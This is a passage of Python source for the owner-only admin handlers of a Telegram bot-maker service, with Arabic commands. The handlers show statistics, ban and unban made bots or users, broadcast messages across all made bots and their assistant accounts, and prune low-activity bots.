      await message.reply_text(f"**البوتات المصنوعه وعددهم : {m} **\n{text}")
   except:
      await message.reply_text("**لا يوجد بوتات مصنوعه .⚡**")


async def get_users(chatsdb) -> list:
    chats_list = []
    async for chat in chatsdb.find({"user_id": {"$gt": 0}}):
        chats_list.append(chat)
    return chats_list

async def get_chats(chatsdb) -> list:
    chats_list = []
    async for chat in chatsdb.find({"chat_id": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

@app.on_message(filters.command("• احصائيات البوتات المصنوعه •", ""))
async def botstatus(client, message):
  if message.chat.username in OWNER:
   m = 0
   d = 0
   u = 0
   text = ""
   bots = Bots.find({})
   try:
    for i in bots:
        try:
          bot_username = i["bot_username"]
          database = mongodb[bot_username]
          chatsdb = database.chats
          chat = len(await get_chats(chatsdb))
          m += chat
          chatsdb = database.users
          chat = len(await get_users(chatsdb))
          u += chat
          d += 1
        except Exception as e:
           print(e)
   except:
        return await message.reply_text("**لا يوجد بوتات مصنوعه .⚡**")
   try:
      await message.reply_text(f"**البوتات المصنوعة {d}**\n**عدد مجموعاتهم {m}**\n**وعدد المستخدمين {u}**")
   except:
      await message.reply_text("**لا يوجد بوتات مصنوعه .⚡**")


@app.on_message(filters.command(["• حظر بوت •", "• حظر مستخدم •", "• الغاء حظر بوت •", "• الغاء حظر مستخدم •"], ""))
async def blockk(client: app, message):
 if message.chat.username in OWNER:
  ask = await client.ask(message.chat.id, "**الان ارسل اليوزرنيم**", timeout=10)
  if ask.text == "الغاء":
     return await ask.reply_text("**تم الإلغاء**")
  i = ask.text
  if "@" in i:
     i = i.replace("@", "")
  if message.command[0] == "• حظر بوت •" or message.command[0] == "• الغاء حظر بوت •":
    bot_username = i
    if await is_served_bot(bot_username):
     if message.command[0] == "• الغاء حظر بوت •":
      await del_served_bot(bot_username)
      return await ask.reply_text("**تم الغاء حظر البوت بنجاح**")
     else:
      return await ask.reply_text("**هذا البوت محظور من قبل**")
    else:
      if message.command[0] == "• الغاء حظر بوت •":
         return await ask.reply_text("**هذا البوت محظور من قبل .✨**") 
      await add_served_bot(bot_username)
      try:
       Done.remove(bot_username)
       boot = appp[bot_username]
       await boot.stop()
       user = usr[bot_username]
       await user.stop()
      except:
       pass
      return await ask.reply_text("**تم حظر هذا البوت بنجاح ✘**")
  else:
    user_id = int(i)
    if await is_block_user(user_id):
     if message.command[0] == "• الغاء حظر مستخدم •":
      await del_block_user(bot_username)
      return await ask.reply_text("**تم الغاء حظر المستخدم من الصانع بنجاح**")
     return await ask.reply_text("**هذا المستخدم محظور من قبل**")
    else:
      if message.command[0] == "• الغاء حظر مستخدم •":
         return await ask.reply_text("**هذا المستخدم محظور من قبل .✨**") 
      await add_block_user(user_id)
      return await ask.reply_text("**تم حظر هذا المستخدم بنجاح ✘**")
   


@app.on_message(filters.command(["• توجيه عام بجميع البوتات •", "• اذاعه عام بجميع البوتات •"], ""))
async def casttoall(client: app, message):
 if message.chat.username in OWNER:
   message_id = message.id 
   sss = "توجيه" if message.command[0] == "• توجيه عام بجميع البوتات •" else "الاذاعه"
   ask = await client.ask(message.chat.id, f"**قم بارسال {sss} الان**", reply_to_message_id=message.id, filters=filters.user(message.from_user.id), timeout=60)
   x = ask.id
   y = message.chat.id
   if ask.text == "الغاء":
      return await ask.reply_text("تم الالغاء")
   pn = await client.ask(message.chat.id, "هل تريد تثبيت الاذاعه\nارسل « نعم » او « لا »", reply_to_message_id=message.id, filters=filters.user(message.from_user.id), timeout=60)
   h = await message.reply_text("**انتظر بضع الوقت جاري الاذاعه**")
   b = 0
   s = 0
   c = 0
   u = 0
   sc = 0
   su = 0
   bots = Bots.find({})
   for bott in bots:
       try:
        b += 1
        s += 1
        bot_username = bott["bot_username"]
        session = bott["session"]
        bot = appp[bot_username]
        user = usr[bot_username]
        db = mongodb[bot_username]
        chatsdb = db.chats
        chats = await get_chats(chatsdb)
        usersdb = db.users
        users = await get_users(usersdb)
        all = []
        for i in users:
            all.append(int(i["user_id"]))
        for i in chats:
            all.append(int(i["chat_id"]))
        for i in all:
            if message.command[0] == "• توجيه عام بجميع البوتات •":
             try:
               m = await bot.forward_messages(i, y, x)
               if m.chat.type == ChatType.PRIVATE:
                  u += 1
               else:
                  c += 1
               if pn.text == "نعم":
                try:
                 await m.pin(disable_notification=False)
                except:
                   continue
             except FloodWait as e:
                flood_time = int(e.value)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
             except Exception as e:
                    continue
            else:
             try:
               m = await bot.send_message(chat_id=i, text=ask.text)
               if m.chat.type == ChatType.PRIVATE:
                  u += 1
               else:
                  c += 1
               if pn.text == "نعم":
                 await m.pin(disable_notification=False)
             except FloodWait as e:
                flood_time = int(e.value)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
             except Exception as e:
                    continue
        async for i in user.get_dialogs():
             chat_id = i.chat.id
             if message.command[0] == "• توجيه عام بجميع البوتات •":
               try:
                  m = await user.forward_messages(i, y, x)
                  if m.chat.type == ChatType.PRIVATE:
                    su += 1
                  else:
                    sc += 1
                  if pn.text == "نعم":
                    await m.pin(disable_notification=False)
               except FloodWait as e:
                    flood_time = int(e.value)
                    if flood_time > 200:
                        continue
                    await asyncio.sleep(flood_time)
               except Exception as e:
                    continue
             else:
               try:
                  m = await user.send_message(chat_id, ask.text)
                  if m.chat.type == ChatType.PRIVATE:
                    su += 1
                  else:
                    sc += 1
                  if pn.text == "نعم":
                    await m.pin(disable_notification=False)
               except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
               except Exception as e:
                    continue
       except Exception as es:
           print(es)
           await message.reply_text(es)
   try:
      await message.reply_text(f"**تم الاذاعه لجميع المصنوعات بنجاح**\n**تم الاذاعه باستخدام {b} بوت**\n**الي {c} مجموعة و {u} مستخدم**\n**تم الاذعه باستخدام {s} مساعد**\n**الي {sc} مجموعة و {su} مستخدم**")
   except Exception as es:
      await message.reply_text(es)


@app.on_message(filters.command(["• اذاعه للمطورين •"], ""))
async def cast_dev(client, message):
 if message.chat.username in OWNER:
  ask = await client.ask(message.chat.id, "**قم بارسال الاذاعه الان**", timeout=30)
  if ask.text == "الغاء":
      return await ask.reply_text("تم الالغاء")
  d = 0
  f = 0
  bots = Bots.find({})
  for i in bots:
      try:
       dev = i["dev"]
       bot_username = i["bot_username"]
       bot = appp[bot_username]
       try: 
         await bot.send_message(dev, ask.text)
         d += 1
       except Exception as es:
        print(es)
        f += 1
      except Exception:
       f += 1
  return await ask.reply_text(f"**تم الارسال الي {d} مطور\n**وفشل الارسال الي {f} مطور**")



@app.on_message(filters.command(["• فحص البوتات •"],""))
async def testbots(client, message):
  if message.chat.username in OWNER:
   bots = Bots.find({})
   text = "احصائيات البوتات المصنوعه"
   b = 0
   for i in bots:
       try:
        bot_username = i["bot_username"]
        database = mongodb[bot_username]
        chatsdb = database.chats
        g = len(await get_chats(chatsdb))
        b += 1
        text += f"\n**{b}- @{bot_username} ، Group : {g}**"
       except Exception as es:
          print(es)
   await message.reply_text(text)



@app.on_message(filters.command(["• تصفيه البوتات •"],""))
async def checkbot(client: app, message):
  if message.chat.username in OWNER:
   ask = await client.ask(message.chat.id, "**ارسل الحد الادني لإحصائيات !**", timeout=30)
   if ask.text == "الغاء":
      return await ask.reply_text("تم الالغاء")
   bots = Bots.find({})
   m = ask.text
   m = int(m)
   text = f"تم ايقاف هذه البوتات لان الاحصائيات اقل من : {ask.text} مجموعة"
   b = 0
   for i in bots:
       try:
        bot_username = i["bot_username"]
        database = mongodb[bot_username]
        chatsdb = database.chats
        g = len(await get_chats(chatsdb))
        if g < m:
         b += 1
         boot = appp[bot_username]
         await boot.stop()
         ii = {"bot_username": bot_username}
         Bots.delete_one(ii)
         try:
           Done.remove(bot_username)
         except:
           pass
         try:
           boot = appp[bot_username]
           await boot.stop()
           user = usr[bot_username]
           await user.stop()
         except:
           pass
         text += f"\n**{b}- @{bot_username} ، Group : {g}**"
       except Exception as es:
          print(es)
   await message.reply_text(text)
        



